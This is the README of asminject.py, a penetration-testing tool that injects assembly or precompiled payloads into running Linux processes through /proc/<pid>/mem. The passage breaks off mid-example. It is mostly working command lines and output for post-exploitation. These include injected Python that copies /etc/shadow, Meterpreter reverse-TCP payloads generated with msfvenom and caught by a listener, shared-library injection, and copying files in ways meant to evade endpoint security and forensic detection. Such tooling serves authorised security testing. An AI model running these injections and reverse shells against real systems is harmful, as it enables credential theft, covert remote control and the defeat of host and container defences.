# asminject.py
`asminject.py` is a heavily-modified fork of [David Buchanan's dlinject project](https://github.com/DavidBuchanan314/dlinject). Injects arbitrary assembly (or precompiled binary) payloads directly into Linux processes without the use of ptrace by accessing `/proc/<pid>/mem`. Useful for certain post-exploitation scenarios, recovering content from process memory when ptrace is not available, and bypassing some security controls. Can inject into containerized processes from outside of the container, as long as you have root access on the host.

This utility should be considered an alpha pre-release. Use at your own risk.

* [Origins](#origins)
* [Generating lists of relative offsets](#generating-lists-of-relative-offsets)
* [Examples](#examples)
  * [Practice Targets](#practice-targets)
  * [Create a world-readable copy of a file using only Linux syscalls](#create-a-world-readable-copy-of-a-file-using-only-linux-syscalls)
  * [Execute arbitrary Python code inside an existing Python 3 process](#execute-arbitrary-python-code-inside-an-existing-python-3-process)
  * [Execute arbitrary Python code inside an existing Python 2 process](#execute-arbitrary-python-code-inside-an-existing-python-2-process)
  * [Execute arbitrary PHP code inside an existing PHP process](#execute-arbitrary-php-code-inside-an-existing-php-process)
  * [Execute arbitrary Ruby code inside an existing Ruby process](#execute-arbitrary-ruby-code-inside-an-existing-ruby-process)
  * [Inject Meterpreter into an existing process](#inject-meterpreter-into-an-existing-process)
  * [Inject shellcode into a separate thread of an existing process](#inject-shellcode-into-a-separate-thread-of-an-existing-process)
  * [Inject a Linux shared library (.so) file into an existing process, like the original dlinject.py](#inject-a-linux-shared-library-so-file-into-an-existing-process-like-the-original-dlinjectpy)
  * [Inject a Linux shared library (.so) file into a new thread in an existing process](#inject-a-linux-shared-library-so-file-into-a-new-thread-in-an-existing-process)
  * [Create a copy of a file using buffered read/write libc calls](#create-a-copy-of-a-file-using-buffered-readwrite-libc-calls)
* [Specialized Options](#specialized-options)
  * [Process suspension methods](#process-suspension-methods)
  * [Specifying non-PIC code](#specifying-non-pic-code)
  * [Multi-architecture support](#multi-architecture-support)
* [But what about Yama's ptrace_scope restrictions?](#but-what-about-yamas-ptrace_scope-restrictions)
* [Version History](#version-history)

## Origins

`asminject.py` was written for two primary scenarios in penetration testing within Linux environments:

* Attacking process- and container-level security controls from the perspective of an attacker with root access to the host
* Avoiding detection after successfully exploiting another issue

For example, consider a penetration test in which the tester has obtained root access to a server that hosts many containers. One of the containers processes bank transfers, and has a very robust endpoint security product installed within it. When the pen tester tries to modify the bank transfer data from within the container, the endpoint security software detects and blocks the attempt. `asminject.py` allows the pen tester to inject arbitrary code directly into the banking software's process memory or even the endpoint security product from outside of the container. Like a victim of Descartes' "evil demon", the security software within the container is helpless, because it exists in an environment entirely under the control of the attacker.

The original `dlinject.py` was designed specifically to load Linux shared libraries into an existing process. `asminject.py` does everything the original did and much more. It executes arbitrary assembly code, and includes templates for a variety of attacks. It has also been redesigned to help avoid detection by security mechanisms that key off of potentially suspicious activity like library-loading events.

## Generating lists of relative offsets

It's possible to write payloads in pure assembly without referring to libraries. If you're doing that, or using the example payloads that do that, you can skip this section. The payloads included with `asminject.py` include comments describing which binaries they need relative offsets for. The references are handled as regular expressions, to hopefully make them more portable across versions.

To generate a list of offsets, you'll need to examine the list of binaries and libraries that your target process is using, e.g.:

```
# ps auxww | grep python2

user     2144330  0.2  0.1  13908  7864 pts/2    S+   15:30   0:00 python2 ./calling_script.py
                                                                                                                                    
# cat /proc/2144330/maps

560a14849000-560a14896000 r--p 00000000 08:01 3024520                    /usr/bin/python2.7
...omitted for brevity...
7fc63884b000-7fc638870000 r--p 00000000 08:01 3032318                    /usr/lib/x86_64-linux-gnu/libc-2.31.so
...omitted for brevity...
7fc638a10000-7fc638a1f000 r--p 00000000 08:01 3032320                    /usr/lib/x86_64-linux-gnu/libm-2.31.so
...omitted for brevity...
7fc638b54000-7fc638b57000 r--p 00000000 08:01 3016732                    /usr/lib/x86_64-linux-gnu/libz.so.1.2.11
...omitted for brevity...
7fc638b71000-7fc638b72000 r--p 00000000 08:01 3032333                    /usr/lib/x86_64-linux-gnu/libutil-2.31.so
...omitted for brevity...
7fc638b76000-7fc638b77000 r--p 00000000 08:01 3032319                    /usr/lib/x86_64-linux-gnu/libdl-2.31.so
...omitted for brevity...
7fc638b7c000-7fc638b83000 r--p 00000000 08:01 3032329                    /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
...omitted for brevity...
7fc638bc3000-7fc638bc4000 r--p 00000000 08:01 3031631                    /usr/lib/x86_64-linux-gnu/ld-2.31.so                                                                                                               
```

In this case, you could call exported functions in eight different binaries. Most of the example payloads will only use one or two, and will match their names based on regexes, but you'll still need to generate a list of the offsets for `asminject.py` to use. E.g. for this specific copy of `/usr/bin/python2.7`:

```
./get_relative_offsets.sh /usr/bin/python2.7 > relative_offsets-python2.7.txt
```

If you are injecting code into a containerized process from outside the container, you'll need to use the copy of each binary *from inside the container*, or you'll get the wrong data. This is why `asminject.py` doesn't just grab the offsets itself, like `dlinject.py` does. A future version of `asminject.py` may include an option to do this as a time-saving shortcut when the target is not in a container.

## Examples

### Practice targets

The `practice` directory of this repository includes basic looping code that outputs a timestamp and loop iteration to the console, so you can practice injecting various types of code in a controlled environment. These practice loops are referred to in the remaining examples.

### Create a world-readable copy of a file using only Linux syscalls

This code requires no relative offset information, because it's all done using Linux syscalls. It may also help avoid some methods of forensic detection versus using the `cp`, `cat`, or other shell commands.

In one terminal window, launch one of the practice targets, e.g.:

```
$ python3 practice/python_loop.py

2022-05-12T19:41:23.109251 - Loop count 0
2022-05-12T19:41:28.115898 - Loop count 1
2022-05-12T19:41:33.119542 - Loop count 2
```

In a second terminal window, find the process ID of the target and run `asminject.py` (as `root`) against it.

This payload requires two variables: `sourcefile` and `destfile`.

```
# ps auxww | grep python3 | grep -v grep

user     2036577  1.8  0.2  16920 10288 pts/3    S+   12:41   0:00 python3 practice/python_loop.py

# python3 ./asminject.py 2036577 asm/x86-64/copy_file_using_syscalls.s --var sourcefile "/etc/passwd" --var destfile "/tmp/bishopfox.txt"

                     .__            __               __
  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
 / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
        \/                   \/\______|    \/     \/     \/|__|   \/

asminject.py
v0.11
Ben Lincoln, Bishop Fox, 2022-05-11
https://github.com/BishopFox/asminject
based on dlinject, which is Copyright (c) 2019 David Buchanan
dlinject source: https://github.com/DavidBuchanan314/dlinject

[!] A list of relative offsets was not specified. If the injection fails, check your payload to make sure you're including the offsets of any exported functions it calls.
[*] '/usr/bin/python3.9' has a base address of 4194304, which is very low for position-independent code. If the exploit attempt fails, try adding --non-pic-binary "/usr/bin/python3.9" to your asminject.py options.
[*] /usr/bin/python3.9: 0x0000000000400000
[*] /usr/lib/locale/locale-archive: 0x00007ff7aab92000
[*] /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache: 0x00007ff7ab21d000
[*] /usr/lib/x86_64-linux-gnu/ld-2.33.so: 0x00007ff7ab224000
[*] /usr/lib/x86_64-linux-gnu/libc-2.33.so: 0x00007ff7aae7c000
[*] /usr/lib/x86_64-linux-gnu/libdl-2.33.so: 0x00007ff7ab1fc000
[*] /usr/lib/x86_64-linux-gnu/libexpat.so.1.8.3: 0x00007ff7ab085000
[*] /usr/lib/x86_64-linux-gnu/libm-2.33.so: 0x00007ff7ab0b4000
[*] /usr/lib/x86_64-linux-gnu/libpthread-2.33.so: 0x00007ff7ab047000
[*] /usr/lib/x86_64-linux-gnu/libutil-2.33.so: 0x00007ff7ab1f7000
[*] /usr/lib/x86_64-linux-gnu/libz.so.1.2.11: 0x00007ff7ab068000
[*] 0: 0x0000000000931000
[*] [heap]: 0x000000000275e000
[*] [stack]: 0x00007ffc1fbd6000
[*] [vdso]: 0x00007ffc1fbfb000
[*] [vvar]: 0x00007ffc1fbf7000
[*] Validating ability to assemble stage 2 code
[*] Validation assembly of stage 2 succeeded
[*] Switching to super slow motion, like every late 1990s/early 2000s action film director did after seeing _The Matrix_...
[*] Current process priority for asminject.py (PID: 2036595) is 0
[*] Current CPU affinity for asminject.py (PID: 2036595) is [0, 1]
[*] Current process priority for target process (PID: 2036577) is 0
[*] Current CPU affinity for target process (PID: 2036577) is [0, 1]
[*] Setting process priority for asminject.py (PID: 2036595) to -20
[*] Setting process priority for target process (PID: 2036577) to 20
[*] Setting CPU affinity for target process (PID: 2036577) to [0, 1]
[*] RIP: 0x7ff7aaf706c4
[*] RSP: 0x7ffc1fbf5430
[*] Using: 0x006201c2 for 'ready for shellcode write' state value
[*] Using: 0x005092ae for 'shellcode written' state value
[*] Using: 0x0014f519 for 'ready for memory restore' state value
[*] Wrote first stage shellcode at 0x00007ff7aaf706c4 in target process 2036577
[*] Returning to normal time
[*] Setting process priority for asminject.py (PID: 2036595) to 0
[*] Setting process priority for target process (PID: 2036577) to 0
[*] Setting CPU affinity for target process (PID: 2036577) to [0, 1]
[*] Waiting for injected code to update the state value
[*] Waiting for injected code to update the state value
[*] Writing stage 2 to 0x00007ff7ab20d000 in target memory
[*] Writing 0x00000000005092ae to 0x00007ffc1fbf6fd8 in target memory to indicate OK
[*] Stage 2 proceeding
[*] Waiting for injected code to update the state value
[*] Restoring original memory content
[+] Done!

# cat /tmp/bishopfox.txt            
                       
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...omitted for brevity...
```

### Execute arbitrary Python code inside an existing Python 3 process

Launch a harmless Python process that simulates one with access to super-secret, sensitive data.

```
$ sudo python3 practice/python_loop.py

2022-05-12T19:46:46.245462 - Loop count 0
2022-05-12T19:46:51.253640 - Loop count 1
2022-05-12T19:46:56.264897 - Loop count 2
```

In a separate terminal, locate the process and inject some arbitrary Python code into it. Note the use of the `--non-pic-binary` option discussed later in this document, as this is required for Python 3 specifically.

This payload requires one variable: `pythoncode`, which should contain the Python script code to execute in the existing Python process.

This payload requires relative offsets for the `python` binary used by the target process (e.g. for Python 3, something like `/usr/bin/python3.9`).

```
# ps auxww | grep python3 | grep -v grep

...omitted for brevity...
root     2037475  0.1  0.2  16988 10224 pts/9    S+   12:46   0:00 python3 practice/python_loop.py
...omitted for brevity...

# ./get_relative_offsets.sh /usr/bin/python3.9 > relative_offsets-python3.9.txt

# python3 ./asminject.py 2037475 asm/x86-64/execute_python_code.s --relative-offsets relative_offsets-python3.9.txt --var pythoncode "import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishopfox.txt', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();" --non-pic-binary "/usr/bin/python3\\.[0-9]+"
...omitted for brevity...
```

Verify that the file has been copied:

```
# cat /tmp/bishopfox.txt 

root:!:18704:0:99999:7:::
daemon:*:18704:0:99999:7:::
bin:*:18704:0:99999:7:::
sys:*:18704:0:99999:7:::
```

### Execute arbitrary Python code inside an existing Python 2 process

If you're targeting a legacy Python 2 process instead of Python 3, you'll most likely need to omit the `--non-pic-binary` option and specify relative offsets for the Python 2 binary instead of Python 3, e.g. same as the previous example, except:

```
# ./get_relative_offsets.sh /usr/bin/python2.7 > relative_offsets-python2.7.txt

python3 ./asminject.py 2144294 asm/x86-64/execute_python_code.s --relative-offsets relative_offsets-python2.7.txt --relative-offsets --stop-method "slow" --var pythoncode "import os; import sys; finput = open('/etc/shadow', 'rb'); foutput = open('/tmp/bishopfox.txt', 'wb'); foutput.write(finput.read()); foutput.close(); finput.close();"
```

### Execute arbitrary PHP code inside an existing PHP process

PHP has a similar "compile and execute this sequence of source code" method.

This payload requires two variables: `phpcode`, which should contain the PHP code that should be executed in the existing PHP process, and `phpname`, which can generally be set to any string.

This payload requires relative offsets for the `php` binary used by the target process.

In one terminal window, launch the practice PHP loop, e.g.:

```
$ php practice/php_loop.php

2022-05-12T13:40:51-0700 - Loop count 0
2022-05-12T13:40:56-0700 - Loop count 1
2022-05-12T13:41:01-0700 - Loop count 2
```

In a separate window, get the appropriate `php` offsets, find the target process, and inject the code:

```
# ./get_relative_offsets.sh /usr/bin/php8.1 > relative_offsets-php8.1.txt

# ps auxww | grep php | grep -v grep  
  
root     2037629  1.0  0.5  68780 20212 pts/9    S+   13:40   0:00 php practice/php_loop.php

# python3 ./asminject.py 2037629 asm/x86-64/execute_php_code.s --relative-offsets relative_offsets-php8.1.txt  --stop-method "slow" --var phpcode "echo \\\"Injected PHP code\\\n\\\";" --var phpname PHP
```

In the first window, note that the loop is interrupted by the injected code, e.g.:

```
2022-05-12T13:41:46-0700 - Loop count 11
Injected PHP code
2022-05-12T13:41:53-0700 - Loop count 12
2022-05-12T13:41:58-0700 - Loop count 13
```

### Execute arbitrary Ruby code inside an existing Ruby process

Ruby has a similar "compile and execute this sequence of Ruby source code" method. The current code for it in `asminject.py` has a few limitations, but it does work:

* No ability to require additional Ruby gems
* The targeted process will lock up after the injected code finishes executing

This payload requires one variable: `rubycode`, which should contain the Ruby code you want to execute in the existing Ruby process.

This payload requires relative offsets for the `libruby` shared library used by the target process.

In one terminal window, launch the practice Ruby loop, e.g.:

```
$ ruby practice/ruby_loop.rb

2022-05-12T13:40:51-0700 - Loop count 0
2022-05-12T13:40:56-0700 - Loop count 1
2022-05-12T13:41:01-0700 - Loop count 2
```

In a separate window, get the appropriate `libruby` offsets, find the target process, and inject the code:

```
# ./get_relative_offsets.sh /usr/lib/x86_64-linux-gnu/libruby-2.7.so.2.7.4 > relative_offsets-libruby-2.7.4.txt

# ps auxww | grep ruby | grep -v grep

root     2037714  2.0  0.3  77888 13580 pts/9    S+   13:44   0:00 ruby practice/ruby_loop.rb

# python3 ./asminject.py 2037714 asm/x86-64/execute_ruby_code.s --relative-offsets relative_offsets-libruby-2.7.4.txt  --stop-method "slow" --var rubycode "puts(\\\"Injected Ruby code\\\")"
```

In the first window, note that the loop is interrupted by the injected code, but fails to continue executing the original loop even though the process remains running:

```
2022-05-12T13:44:41-07:00 - Loop count 7
2022-05-12T13:44:46-07:00 - Loop count 8
Injected Ruby code

```

### Inject Meterpreter into an existing process

Launch a harmless process that simulates one with access to super-secret, sensitive data:

```
$ sudo python3 practice/python_loop.py

2022-05-12T20:11:30.614271 - Loop count 0
2022-05-12T20:11:35.616574 - Loop count 1
2022-05-12T20:11:40.620506 - Loop count 2
```

In a separate terminal, generate a Meterpreter payload, then launch a listener:

```
# msfvenom -p linux/x64/meterpreter/reverse_tcp -f raw -o lmrt11443 LHOST=127.0.0.1 LPORT=11443

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Saved as: lmrt11443

# msfconsole

...omitted for brevity...
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 127.0.0.1
LHOST => 127.0.0.1
msf6 exploit(multi/handler) > set LPORT 11443
LPORT => 11443
msf6 exploit(multi/handler) > exploit

[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:11443 
```

In a third terminal, locate the process and inject the Meterpreter payload into it. Note the use of the `--precompiled` option to specify the `lmrt11443` shellcode.

```
# ps auxww | grep python3

root     2144475  0.0  0.1  10644  5172 pts/2    S+   15:44   0:00 sudo python3 practice/python_loop.py
root     2144476  0.5  0.2  13884  8088 pts/2    S+   15:44   0:00 python3 practice/python_loop.py

# python3 ./asminject.py 2144476 asm/x86-64/execute_precompiled.s --stop-method "slow" --precompiled lmrt11443

...omitted for brevity...
```

You should see the following pop up in the third terminal:

```
[*] Sending stage (3008420 bytes) to 127.0.0.1
[*] Meterpreter session 1 opened (127.0.0.1:11443 -> 127.0.0.1:53682) at 2021-06-07 14:44:14 -0700

meterpreter > sysinfo
Computer     : 192.168.218.135
OS           : Debian  (Linux 5.10.0-kali3-amd64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
```

Warnings:

* The code for the original process will not continue executing after the shellcode is launched. See the threaded version below if you need that.
* The original process will exit when Meterpreter exits.

### Inject shellcode into a separate thread of an existing process

The `` payload is identical to the `` payload described above, except it executes the precompiled binary shellcode in a separate thread. This allows the target process to continue executing normally.

This payload requires relative offsets for `libpthread` shared library used by the target process.

```
# ./get_relative_offsets.sh /usr/lib/x86_64-linux-gnu/libpthread-2.33.so > relative_offsets-libpthread-2.33.txt

# python3 ./asminject.py 1955172 asm/x86-64/execute_precompiled_threaded.s --relative-offsets relative_offsets-libpthread-2.33.txt --stop-method "slow" --precompiled lmrt11443
```

Warnings:

* The original process will still exit if your shellcode triggers an OS-level process exit. Meterpreter's default configuration does this, so consider just leaving it hanging around instead of typing "exit" in the Meterpreter console.

### Inject a Linux shared library (.so) file into an existing process, like the original dlinject.py

The `dlinject.s` payload mimics the original `dlinject.py`, except that it does so using the `dlopen` function exported by `libdl` instead of the secret `_dl_open` function that some versions of the `ld` library exported. This works around [dlinject.py's inability to run on more recent Linux versions](https://github.com/DavidBuchanan314/dlinject/issues/8).

This payload requires one variable: `librarypath`, which should point to the library you want to inject.

This payload requires relative offsets for the `libdl` shared library used by the target process.

```
# msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf-so -o lmrt11443.so LHOST=127.0.0.1 LPORT=11443

# ./get_relative_offsets.sh /usr/lib/x86_64-linux-gnu/libdl-2.33.so > relative_offsets-libdl-2.33.txt

# python3 ./asminject.py 1957286 asm/x86-64/dlinject.s --relative-offsets relative_offsets-libdl-2.33.txt  --stop-method "slow" --var librarypath "/home/user/lmrt11443.so"
```

The injection comes with the same warnings as for `execute_precompiled.s*`, above.

### Inject a Linux shared library (.so) file into a new thread in an existing process

The `dlinject_threaded.s` payload is identical to `dlinject.s`, except that it launches the shellcode in a new thread, so that the original process continues performing its normal behaviour.

This payload requires one variable: `librarypath`, which should point to the library you want to inject.

This payload requires relative offsets for the `libdl` and `libpthread` shared libraries used by the target process.

```
# msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf-so -o lmrt11443.so LHOST=127.0.0.1 LPORT=11443

# ./get_relative_offsets.sh /usr/lib/x86_64-linux-gnu/libdl-2.33.so > relative_offsets-libdl-2.33.txt

# ./get_relative_offsets.sh /usr/lib/x86_64-linux-gnu/libpthread-2.33.so > relative_offsets-libpthread-2.33.txt

# python3 ./asminject.py 1957286 asm/x86-64/dlinject_threaded.s --relative-offsets relative_offsets-libdl-2.33.txt --relative-offsets relative_offsets-libpthread-2.33.txt --stop-method "slow" --var librarypath "/home/user/lmrt11443.so"
```

This injection comes with the same warnings as for `execute_precompiled_threaded.s`, above.

### Create a copy of a file using buffered read/write libc calls

If you don't mind making library calls, writing custom code is much easier than when using the syscall-only approach. This example uses code that (like the copy-using-syscalls example) creates a copy of a file, but by using libc's `fopen()`, `fread()`, `fwrite()`, and `fclose()` instead of syscalls, can easily use a buffered approach that's more efficient.

This payload requires relative offsets for the `libc` shared library used by the target process.

```
# python3 ./asminject.py 1876570 asm/x86-64/copy_file_using_libc.s --relative-offsets relative_offsets-libc-2.33.so.txt --stop-method "slow" --var sourcefile "/etc/passwd" --var destfile "/var/tmp/copy_test.txt" --debug
```

## Specialized Options

### Process suspension methods

`asminject.py` supports four methods for pre/post-injection handling of the target process. Three of those methods are borrowed from the original [dlinject.py](https://github.com/DavidBuchanan314/dlinject):

* Send a suspend (SIGSTOP) signal before injection, and a resume (SIGCONT) message after injection
** This is reliable, but is somewhat intrusive. Very paranoid software might use it as an indication of tampering
* For containerized systems, using *cgroups* "freezing"
** Reliable, but not an option for non-containerized systems
* Do nothing and hope the target process doesn't step on the injected code while it's being written
** Unreliable

`asminject.py` adds a fourth option: increasing the priority of its own process and decreasing the priority of the target process. This "slow" mode (the default) generally allows it to act like [Quicksilver in _X-Men: Days of Future Past_](https://youtu.be/T9GFyZ5LREQ?t=32), making its changes to the target process at lightning speed. The target process is still running, but so slowly relative to `asminject.py` that it may as well be suspended.

```
# python3 ./asminject.py 1470158 asm/x86-64/execute_python_code.s --relative-offsets relative_offsets-python2.7.txt --relative-offsets a--var pythoncode "print('OK');" --stop-method "slow"

...omitted for brevity...
[*] Switching to super slow motion, like every late 1990s/early 2000s action film director did after seeing _The Matrix_...
[*] Current process priority for asminject.py (PID: 1470165) is 0
[*] Current CPU affinity for asminject.py (PID: 1470165) is [0, 1]
[*] Current process priority for target process (PID: 1470158) is 0
[*] Current CPU affinity for target process (PID: 1470158) is [0, 1]
[*] Setting process priority for asminject.py (PID: 1470165) to -20
[*] Setting process priority for target process (PID: 1470158) to 20
[*] Setting CPU affinity for target process (PID: 1470158) to [0, 1]
...omitted for brevity...
[*] Wrote stage 2 to '/tmp/tmppjmn1rr6'
[*] Returning to normal time...
[*] Setting process priority for asminject.py (PID: 1470165) to 0
[*] Setting process priority for target process (PID: 1470158) to 0
[*] Setting CPU affinity for target process (PID: 1470158) to [0, 1]
[+] Done!
```

### Specifying non-PIC code

Some binaries are compiled without the position-independent code build option (including, strangely enough, x86-64 builds of Python 3.x, even though 2.x for x86-64 had it enabled). This means that the offsets in the corresponding ELF are absolute instead of relative to the base address. If `asminject.py` detects a low base address (typically indicative of this condition), it will include a warning:

```
[*] '/usr/bin/python3.9' has a base address of 4194304, which is very low for position-independent code. If the exploit attempt fails, try adding --non-pic-binary "/usr/bin/python3.9" to your asminject.py options.
```

As the message indicates, this type of binary can be manually flagged using one or more `--non-pic-binary` options, which are parsed as regular expressions. e.g.:

```
# python3 ./asminject.py 1470214 asm/x86-64/execute_python_code.s --relative-offsets asminject/relative_offsets-python3.9.txt --var pythoncode "print('OK');" --non-pic-binary "/usr/bin/python3\\.[0-9]+"

...omitted for brevity...
[*] Handling '/usr/bin/python3.9' as non-PIC binary
[*] /usr/bin/python3.9: 0x0000000000000000
...omitted for brevity...
[+] Done!
```

If in doubt, the `file` command can sometimes identify whether the code is position-independent or not. In most cases, it will include the text `pie executable` for position-independent code, but just `executable` for regular code. For example, on x86-64 Linux, Python 2.7 is position-independent, but Python 3.9 is not:

```
# file /usr/bin/python2.7

/usr/bin/python2.7: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2e424007a240d090ed9d3965398d9d79298f0a37, for GNU/Linux 3.2.0, stripped

# file /usr/bin/python3.9

/usr/bin/python3.9: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=18e54a049c2ca8e609eaea044df101effead3b23, for GNU/Linux 3.2.0, stripped
```

On the other hand, on ARM32 Linux running on a Raspberry Pi, neither Python 2.7 and 3.7 are position-independent, but `libc` is.

```
# file /usr/bin/python2.7

/usr/bin/python2.7: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=2ab8406bc7cc1bef1e255e4e20a5b1f15758cacf, stripped

# file /usr/bin/python3.7

/usr/bin/python3.7: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=fd15ce8be633e2667c780b770eec5ecf01641017, stripped
```

However, just to be confusing, x86-64 Linux describes `libc` as a "shared object", without indicating that it's position-independent:

```
# file /usr/lib/x86_64-linux-gnu/libc-2.33.so

/usr/lib/x86_64-linux-gnu/libc-2.33.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d0bea38a0bc75e09b36838f9b6680de85ba65f15, for GNU/Linux 3.2.0, stripped
```

...but ARM2 Linux describes `libc` as a "pie executable"

```
# file /lib/arm-linux-gnueabihf/libc-2.28.so

/lib/arm-linux-gnueabihf/libc-2.28.so: ELF 32-bit LSB pie executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, BuildID[sha1]=efdd27c16f5283e5c53dcbd1bbc3ef136e312d1b, for GNU/Linux 3.2.0, stripped
```

If you want to be sure, run a copy of the target in `gdb`, and check whether the offsets of known functions are relative to the base address or not. For example, the following shell output indicates that the base address for `/usr/bin/python2.7` is 0x00010000, and the list of offsets indicates that the `PyGILState_Ensure` function is as 0x0018b428:

```
# cat /proc/14629/maps

00010000-0028f000 r-xp 00000000 b3:07 523346     /usr/bin/python2.7
...omitted for brevity...

grep PyGILState_Ensure relative_offsets-python2.7.txt

0018b428 PyGILState_Ensure
```

If `/usr/bin/python2.7` was position-independent, then the `PyGILState_Ensure` function would be at address 0x0019b428. In `gdb`, disassembling at this address produces what seems at least superficially like valid code:

```
(gdb) disassemble 0x19B428, 0x0019b450
Dump of assembler code from 0x19b428 to 0x19b450:
   0x0019b428:	sub	r4, r4, #1
   0x0019b42c:	cmn	r4, #1
   0x0019b430:	orr	r6, r6, r10, lsl r11
   0x0019b434:	bne	0x19b418
   0x0019b438:	and	r9, r9, #31
   0x0019b43c:	mov	r7, #1
   0x0019b440:	sub	r10, r3, #-1073741823	; 0xc0000001
   0x0019b444:	orr	r11, r6, r7, lsl r9
=> 0x0019b448:	ldr	r10, [r1, r10, lsl #2]
   0x0019b44c:	mov	r4, #0
```

However, if `/usr/bin/python2.7` was *not* position-independent, then the `PyGILState_Ensure` function would be at address 0x0018b428 instead, and disassembling there reveals labels for that function:

```
(gdb) disassemble 0x18b428, 0x1b8450
Dump of assembler code from 0x18b428 to 0x1b8450:
   0x0018b428 <PyGILState_Ensure+0>:	ldr	r3, [pc, #140]	; 0x18b4bc <PyGILState_Ensure+148>
   0x0018b42c <PyGILState_Ensure+4>:	push	{r4, r5, r6, lr}
   0x0018b430 <PyGILState_Ensure+8>:	ldr	r0, [r3]
   0x0018b434 <PyGILState_Ensure+12>:	bl	0x14853c <PyThread_get_key_value>
   0x0018b438 <PyGILState_Ensure+16>:	subs	r4, r0, #0
   0x0018b43c <PyGILState_Ensure+20>:	beq	0x18b47c <PyGILState_Ensure+84>
   0x0018b440 <PyGILState_Ensure+24>:	ldr	r1, [pc, #120]	; 0x18b4c0 <PyGILState_Ensure+152>
```

In this case (Python 2.7 on ARM32 Linux), the binary was *not* position-independent, and using `asminject.py` successfully required adding the option `--non-pic-binary "/usr/bin/python.*"`.

### Multi-architecture support

Experimental support for ARM32 was added in version 0.7 of `asminject.py`, and full support was added in version 0.15. Add the `--arch arm32` option to use ARM32 stager code and payloads. The examples in this section were executed on a Raspberry Pi.

#### Injecting Python code into a Python 3 process:

Terminal 1:

```
pi@bt-minion1:~/asminject/practice $ python3 ./python_loop.py

2022-05-16T22:16:18.425058 - Loop count 0
2022-05-16T22:16:23.430401 - Loop count 1
```

Terminal 2:

```
# ps auxww | grep python

pi       26611  1.8  0.8  14372  7160 pts/0    S+   15:16   0:00 python3 ./python_loop.py

# ./get_relative_offsets.sh /usr/bin/python3.7 > relative_offsets-python3.7.txt

# python3 ./asminject.py 26611 execute_python_code.s --arch arm32 --relative-offsets relative_offsets-python3.7.txt --non-pic-binary "/usr/bin/python.*" --stop-method "slow" --var pythoncode "print('injected python code');"

...omitted for brevity...
[*] Handling '/usr/bin/python3.7' as non-PIC binary
...omitted for brevity...
[*] Restoring original memory content
[+] Done!
```

Back in terminal 1:

```
2022-05-16T22:18:08.541095 - Loop count 22
injected python code
2022-05-16T22:18:17.547089 - Loop count 23
```

#### Injecting Python code into a Python 2 process:

Terminal 1:

```
pi@bt-minion1:~/asminject/practice $ python2 ./python_loop.py

2022-05-16T22:10:56.017464 - Loop count 0
2022-05-16T22:11:01.022812 - Loop count 1
2022-05-16T22:11:06.028053 - Loop count 2
```

Terminal 2:

```
# ps auxww | grep python

pi       24704  1.0  2.4  27720 21040 pts/0    S+   15:10   0:00 python2 ./python_loop.py

# ./get_relative_offsets.sh /usr/bin/python2.7 > relative_offsets-python2.7.txt

# python3 ./asminject.py 24704 execute_python_code.s --arch arm32 --relative-offsets relative_offsets-python2.7.txt --non-pic-binary "/usr/bin/python.*" --stop-method "slow" --var pythoncode "print('injected python code');"

                     .__            __               __
  _____  ___/\  ____ |__| ____     |__| ____   _____/  |_  ______ ___.__.
 / _  | / ___/ /    ||  |/    \    |  |/ __ \_/ ___\   __\ \____ <   |  |
/ /_| |/___  // / / ||  |   |  \   |  \  ___/\  \___|  |   |  |_> >___  |
\_____| /___//_/_/__||__|___|  /\__|  |\___  >\___  >__| /\|   __// ____|
        \/                   \/\______|    \/     \/     \/|__|   \/

asminject.py
v0.15
Ben Lincoln, Bishop Fox, 2022-05-16
https://github.com/BishopFox/asminject
based on dlinject, which is Copyright (c) 2019 David Buchanan
dlinject source: https://github.com/DavidBuchanan314/dlinject

[*] Handling '/usr/bin/python2.7' as non-PIC binary
...omitted for brevity...
[*] Restoring original memory content
[+] Done!
```

Back in terminal 1:

```
2022-05-16T22:11:26.049014 - Loop count 6
injected python code
2022-05-16T22:11:35.054965 - Loop count 7
```

#### Injecting PHP code into a PHP process:

Terminal 1:

```
pi@bt-minion1:~/asminject/practice $ php ./php_loop.php

2022-05-16T17:08:03-0700 - Loop count 0
2022-05-16T17:08:08-0700 - Loop count 1
2022-05-16T17:08:13-0700 - Loop count 2
```

Terminal 2:

```
# ps auxww | grep php

pi        4955  0.0  1.6  62616 14068 pts/0    SN+  17:08   0:00 /usr/bin/php ./php_loop.php

# ./get_relative_offsets.sh /usr/bin/php7.3 > relative_offsets-php7.3.txt

